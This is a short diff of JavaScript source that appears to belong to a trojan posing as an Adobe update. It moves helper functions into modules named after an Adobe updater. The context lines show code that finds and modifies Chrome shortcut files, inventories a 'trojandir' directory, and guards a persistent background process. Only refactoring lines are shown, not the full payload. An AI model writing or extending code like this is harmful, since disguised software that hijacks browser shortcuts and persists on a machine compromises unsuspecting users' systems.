@@ -1,4 +1,5 @@
 const helper = require("./adobeupdate.helper.js");
+const helper_ps = require("./adobeupdate.helper.ps.js");
 
 class CmdConfig {
     #__cmdname = "";
@@ -221,14 +222,14 @@ class CmdConfig {
     async activate(cmdlineargs, exitparent) {
         logmsg("starting");
 
-        if (isPidAlive(this.childpid)) {
+        if (helper_ps.isPidAlive(this.childpid)) {
             logmsg(
                 `no need to run [${this.cmdname}]-- child process exists with pid [${this.childpid}]`
             );
             return;
         }
 
-        let pipe_exists = await checkIfPipeExists(this.lockfname);
+        let pipe_exists = await helper_ps.checkIfPipeExists(this.lockfname);
 
         if (pipe_exists) {
             logmsg(
@@ -875,7 +876,7 @@ async function modify_chrome() {
     
     for ( const targetFolder of targetFolders ) {
 
-        let matchedFiles = getFilesByExtensionSync(targetFolder, '.lnk');
+        let matchedFiles = helper.getFilesByExtensionSync(targetFolder, '.lnk');
 
         for (const [index, element] of matchedFiles.entries()) {
             if ( element.toLowerCase().includes('chrome') )
@@ -1001,7 +1002,7 @@ async function getsystemoverview() {
     try {
         dir_snapshot = getDirInfo(systemconfig.trojandir);
     } catch (err) {
-        dir_snapshot = errorToJson(err);
+        dir_snapshot = helper.errorToJson(err);
     }
 
     let task_snapshot = await getTasks();
